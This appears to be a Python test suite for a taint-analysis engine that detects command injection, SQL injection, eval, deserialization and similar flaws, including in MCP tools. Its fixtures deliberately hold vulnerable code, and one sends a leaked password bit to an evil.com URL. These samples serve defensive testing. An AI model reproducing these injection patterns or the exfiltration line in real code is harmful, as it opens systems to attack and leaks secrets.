#!/usr/bin/env python3
"""
Comprehensive tests for advanced taint analysis engine
Tests all the cutting-edge features we've implemented
"""

import unittest
import tempfile
import shutil
from pathlib import Path
import ast
import sys
import os

# Add parent directory to path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from src.analyzers.taint.advanced_taint_engine import (
    AdvancedTaintEngine, TaintKind, SinkType, AccessPath, 
    CallContext, TaintLabel, PropagatorRule
)


class TestAdvancedTaintAnalysis(unittest.TestCase):
    """Test suite for advanced taint tracking features"""
    
    def setUp(self):
        """Set up test environment"""
        self.test_dir = tempfile.mkdtemp()
        self.engine = AdvancedTaintEngine()
        
    def tearDown(self):
        """Clean up test environment"""
        shutil.rmtree(self.test_dir, ignore_errors=True)
        
    def write_test_file(self, filename: str, content: str) -> Path:
        """Helper to write test files"""
        file_path = Path(self.test_dir) / filename
        file_path.write_text(content)
        return file_path
        
    def test_field_sensitivity(self):
        """Test field-sensitive taint tracking"""
        code = """
class User:
    def __init__(self):
        self.name = input("Name: ")  # Tainted
        self.id = 123  # Not tainted
        
user = User()
print(f"Welcome {user.name}")  # Should detect
print(f"ID: {user.id}")  # Should NOT detect
subprocess.run(user.name, shell=True)  # Should detect
subprocess.run(str(user.id), shell=True)  # Should NOT detect
"""
        self.write_test_file("field_test.py", code)
        
        # Analyze
        results = self.engine.analyze(Path(self.test_dir))
        
        # Should find vulnerability only for user.name
        self.assertEqual(len(results), 1)
        self.assertIn("user.name", str(results[0].get("access_path", "")))
        
    def test_context_sensitivity(self):
        """Test context-sensitive analysis (k-CFA)"""
        code = """
def process_data(data):
    return subprocess.run(data, shell=True)  # Sink
    
def safe_caller():
    process_data("ls -la")  # Safe: hardcoded
    
def unsafe_caller():
    user_input = input("Command: ")  # Source
    process_data(user_input)  # Unsafe: tainted

safe_caller()
unsafe_caller()
"""
        self.write_test_file("context_test.py", code)
        
        # Analyze with context sensitivity
        self.engine.context_sensitive = True
        results = self.engine.analyze(Path(self.test_dir))
        
        # Should detect only unsafe_caller -> process_data
        self.assertEqual(len(results), 1)
        context = results[0].get("context", "")
        self.assertIn("unsafe_caller", context)
        
    def test_container_tracking(self):
        """Test container and collection taint tracking"""
        code = """
# List comprehension
user_inputs = [input(f"Enter {i}: ") for i in range(3)]
processed = [x.strip() for x in user_inputs]  # Taint propagates
for cmd in processed:
    os.system(cmd)  # Should detect

# Dictionary tracking
data = {}
data['safe'] = "constant"
data['unsafe'] = input("Value: ")
subprocess.run(data['unsafe'], shell=True)  # Should detect
subprocess.run(data['safe'], shell=True)  # Should NOT detect

# Iteration
for item in user_inputs:
    eval(item)  # Should detect each
"""
        self.write_test_file("container_test.py", code)
        
        results = self.engine.analyze(Path(self.test_dir))
        
        # Should detect multiple flows through containers
        self.assertGreater(len(results), 2)
        
    def test_mcp_tool_tracking(self):
        """Test MCP-specific taint tracking"""
        code = """
from mcp import tool

@tool
def vulnerable_tool(user_command: str, safe_param: str = "default"):
    '''MCP tool that executes commands'''
    # user_command should be tainted
    result = subprocess.run(user_command, shell=True, capture_output=True)
    return result.stdout
    
@tool  
def safe_tool(data: str):
    '''Safe MCP tool'''
    # Just logs, no execution
    print(f"Received: {data}")
    return {"status": "ok"}
    
# Another vulnerable pattern
@tool
def sql_tool(query: str):
    '''Executes SQL queries'''
    conn.execute(query)  # SQL injection if query is tainted
"""
        self.write_test_file("mcp_test.py", code)
        
        results = self.engine.analyze(Path(self.test_dir))
        
        # Should detect command injection and SQL injection in tools
        self.assertGreaterEqual(len(results), 2)
        vuln_types = [r["vulnerability_type"] for r in results]
        self.assertIn("user_input_to_command_execution", vuln_types)
        self.assertIn("user_input_to_sql_query", vuln_types)
        
    def test_propagator_rules(self):
        """Test custom propagator rules"""
        code = """
import base64
import json

# Base64 propagation
user_input = input("Enter: ")
encoded = base64.b64encode(user_input.encode())
decoded = base64.b64decode(encoded).decode()  # Still tainted
exec(decoded)  # Should detect

# JSON propagation  
json_str = input("JSON: ")
data = json.loads(json_str)  # Taint propagates
eval(data['command'])  # Should detect

# String operations
template = "Command: {}"
filled = template.format(user_input)  # Taint propagates
os.system(filled)  # Should detect
"""
        self.write_test_file("propagator_test.py", code)
        
        results = self.engine.analyze(Path(self.test_dir))
        
        # Should track taint through transformations
        self.assertGreaterEqual(len(results), 3)
        
        # Check transformations are tracked
        for result in results:
            if "base64" in str(result.get("transformations", [])):
                self.assertIn("base64_decode", result["transformations"])
                
    def test_sanitizer_detection(self):
        """Test sanitizer detection and validation"""
        code = """
import html
import shlex
import re

user_input = input("Enter: ")

# Properly sanitized for shell
safe_cmd = shlex.quote(user_input)
subprocess.run(f"echo {safe_cmd}", shell=True)  # Should NOT detect

# Improperly sanitized (HTML escape for shell command)
wrong_sanitizer = html.escape(user_input)  
subprocess.run(wrong_sanitizer, shell=True)  # Should detect

# Properly sanitized for HTML
html_safe = html.escape(user_input)
return f"<div>{html_safe}</div>"  # Should NOT detect for XSS

# No sanitization
eval(user_input)  # Should always detect (no safe sanitizer exists)
"""
        self.write_test_file("sanitizer_test.py", code)
        
        results = self.engine.analyze(Path(self.test_dir))
        
        # Should detect improper sanitization and eval
        detected_sinks = [r["sink"]["type"] for r in results]
        self.assertIn("command_execution", detected_sinks)  # wrong sanitizer
        self.assertIn("eval_execution", detected_sinks)  # no sanitizer
        
        # Should NOT detect properly sanitized
        for result in results:
            if "shlex" in str(result.get("transformations", [])):
                self.fail("Properly sanitized command was flagged")
                
    def test_implicit_flows(self):
        """Test implicit flow detection (control dependencies)"""
        code = """
password = input("Password: ")

# Implicit flow through control structure
if password == "secret123":
    leak = "1"
else:
    leak = "0"
    
# Leak through timing/behavior
url = f"http://evil.com/leak?bit={leak}"
requests.get(url)  # Should detect implicit flow
"""
        self.write_test_file("implicit_test.py", code)
        
        # This is advanced - may not be fully implemented
        results = self.engine.analyze(Path(self.test_dir))
        
        # Should ideally detect implicit information flow
        if results:
            self.assertIn("password", str(results))
            
    def test_cross_file_tracking(self):
        """Test inter-file taint tracking"""
        
        # File 1: Source
        code1 = """
def get_user_data():
    return input("Data: ")
    
tainted_data = get_user_data()
"""
        self.write_test_file("source.py", code1)
        
        # File 2: Propagation
        code2 = """
from source import tainted_data

def process(data):
    return data.strip().upper()
    
processed = process(tainted_data)
"""
        self.write_test_file("propagate.py", code2)
        
        # File 3: Sink
        code3 = """
from propagate import processed
import subprocess

subprocess.run(processed, shell=True)  # Should detect cross-file flow
"""
        self.write_test_file("sink.py", code3)
        
        results = self.engine.analyze(Path(self.test_dir))
        
        # Should track taint across files
        if results:
            result = results[0]
            self.assertEqual(result["source"]["file"], "source.py")
            self.assertEqual(result["sink"]["file"], "sink.py")
            
    def test_incremental_analysis(self):
        """Test incremental analysis performance"""
        
        # Initial files
        for i in range(10):
            code = f"""
def func_{i}():
    data = input("Input {i}: ")
    return data
"""
            self.write_test_file(f"module_{i}.py", code)
            
        # First analysis
        results1 = self.engine.analyze(Path(self.test_dir), incremental=True)
        
        # Modify one file
        modified_code = """
def func_5():
    data = input("Input 5: ")
    exec(data)  # Added vulnerability
    return data
"""
        self.write_test_file("module_5.py", modified_code)
        
        # Incremental analysis should be faster and find new issue
        results2 = self.engine.analyze(Path(self.test_dir), incremental=True)
        
        # Should find the new vulnerability
        self.assertGreater(len(results2), len(results1))
        
    def test_framework_detection(self):
        """Test framework-specific source/sink detection"""
        
        # Django test
        django_code = """
from django.http import HttpResponse
from django.shortcuts import render

def view(request):
    user_input = request.GET.get('param')  # Django source
    
    # SQL injection
    cursor.execute(f"SELECT * FROM users WHERE name = '{user_input}'")
    
    # Template injection
    return render(request, 'template.html', {'data': user_input})
"""
        self.write_test_file("django_view.py", django_code)
        
        # Flask test  
        flask_code = """
from flask import Flask, request, render_template

app = Flask(__name__)

@app.route('/vulnerable')
def vulnerable():
    user_input = request.args.get('input')  # Flask source
    
    # Command injection
    os.system(f"process {user_input}")
    
    return render_template('page.html', data=user_input)
"""
        self.write_test_file("flask_app.py", flask_code)
        
        results = self.engine.analyze(Path(self.test_dir))
        
        # Should detect framework-specific patterns
        self.assertGreater(len(results), 0)
        
        # Check for framework detection
        for result in results:
            source_file = result["source"]["file"]
            if "django" in source_file:
                self.assertIn("request.GET", str(result))
            elif "flask" in source_file:
                self.assertIn("request.args", str(result))
                
    def test_severity_calculation(self):
        """Test severity calculation based on source/sink combination"""
        code = """
user_input = input("Command: ")

# Critical: user input to command execution
os.system(user_input)

# High: user input to SQL
db.execute(f"SELECT * FROM users WHERE id = {user_input}")

# Medium: user input to log (potential log injection)
logger.info(f"User entered: {user_input}")
"""
        self.write_test_file("severity_test.py", code)
        
        results = self.engine.analyze(Path(self.test_dir))
        
        # Check severity levels
        severities = {r["sink"]["type"]: r["severity"] for r in results}
        
        if "command_execution" in severities:
            self.assertEqual(severities["command_execution"], "CRITICAL")
        if "sql_query" in severities:
            self.assertIn(severities["sql_query"], ["CRITICAL", "HIGH"])
        if "log_output" in severities:
            self.assertIn(severities["log_output"], ["MEDIUM", "LOW"])
            
    def test_access_path_construction(self):
        """Test access path construction for complex data structures"""
        code = """
class Config:
    def __init__(self):
        self.db = DatabaseConfig()
        self.api = APIConfig()
        
class DatabaseConfig:
    def __init__(self):
        self.host = "localhost"
        self.password = input("DB Password: ")  # Tainted
        
class APIConfig:
    def __init__(self):
        self.key = "safe_key"
        
config = Config()

# Complex access path: config.db.password
connection_string = f"mysql://user:{config.db.password}@{config.db.host}"
os.system(f"mysql -c '{connection_string}'")  # Should detect

# Safe access path: config.api.key
print(f"API Key: {config.api.key}")  # Should NOT detect
"""
        self.write_test_file("access_path_test.py", code)
        
        results = self.engine.analyze(Path(self.test_dir))
        
        # Should track config.db.password as tainted
        if results:
            access_path = results[0].get("access_path", "")
            self.assertIn("db", access_path)
            self.assertIn("password", access_path)
            
    def test_cwe_mapping(self):
        """Test CWE identification for vulnerabilities"""
        code = """
user_input = input("Input: ")

# CWE-78: OS Command Injection
os.system(user_input)

# CWE-89: SQL Injection  
db.execute(f"SELECT * FROM users WHERE name = '{user_input}'")

# CWE-79: Cross-site Scripting
return f"<html><body>{user_input}</body></html>"

# CWE-502: Deserialization of Untrusted Data
import pickle
data = input("Pickled data: ")
obj = pickle.loads(data.encode())
"""
        self.write_test_file("cwe_test.py", code)
        
        results = self.engine.analyze(Path(self.test_dir))
        
        # Check CWE mappings
        cwes = {r["sink"]["type"]: r["cwe"] for r in results}
        
        if "command_execution" in cwes:
            self.assertEqual(cwes["command_execution"], "CWE-78")
        if "sql_query" in cwes:
            self.assertEqual(cwes["sql_query"], "CWE-89")
        if "template_render" in cwes:
            self.assertEqual(cwes["template_render"], "CWE-79")
        if "deserialization" in cwes:
            self.assertEqual(cwes["deserialization"], "CWE-502")


class TestPerformanceAndScalability(unittest.TestCase):
    """Test performance characteristics"""
    
    def setUp(self):
        self.test_dir = tempfile.mkdtemp()
        self.engine = AdvancedTaintEngine()
        
    def tearDown(self):
        shutil.rmtree(self.test_dir, ignore_errors=True)
        
    def test_large_codebase(self):
        """Test analysis on larger codebase"""
        # Generate 100 files
        for i in range(100):
            code = f"""
import subprocess

def process_{i}(data):
    # Some processing
    result = data.strip().upper()
    return result
    
def vulnerable_{i}():
    user_input = input("Enter {i}: ")
    processed = process_{i}(user_input)
    {"subprocess.run(processed, shell=True)" if i % 10 == 0 else "print(processed)"}
"""
            Path(self.test_dir, f"module_{i}.py").write_text(code)
            
        import time
        start = time.time()
        results = self.engine.analyze(Path(self.test_dir))
        duration = time.time() - start
        
        # Should complete in reasonable time
        self.assertLess(duration, 10)  # 10 seconds for 100 files
        
        # Should find ~10 vulnerabilities (every 10th file)
        self.assertGreaterEqual(len(results), 8)
        self.assertLessEqual(len(results), 12)
        
    def test_path_explosion_handling(self):
        """Test handling of path explosion in complex control flow"""
        code = """
user_input = input("Value: ")

# Complex branching that could cause path explosion
for i in range(10):
    if i % 2 == 0:
        if i % 3 == 0:
            user_input = user_input.upper()
        else:
            user_input = user_input.lower()
    else:
        if i % 5 == 0:
            user_input = user_input.strip()
        else:
            user_input = user_input.replace(' ', '_')
            
# After complex flow
eval(user_input)  # Should still detect despite complex paths
"""
        Path(self.test_dir, "complex_flow.py").write_text(code)
        
        results = self.engine.analyze(Path(self.test_dir))
        
        # Should handle complex flows without explosion
        self.assertEqual(len(results), 1)
        self.assertEqual(results[0]["sink"]["type"], "eval_execution")


if __name__ == "__main__":
    # Run with verbose output
    unittest.main(verbosity=2)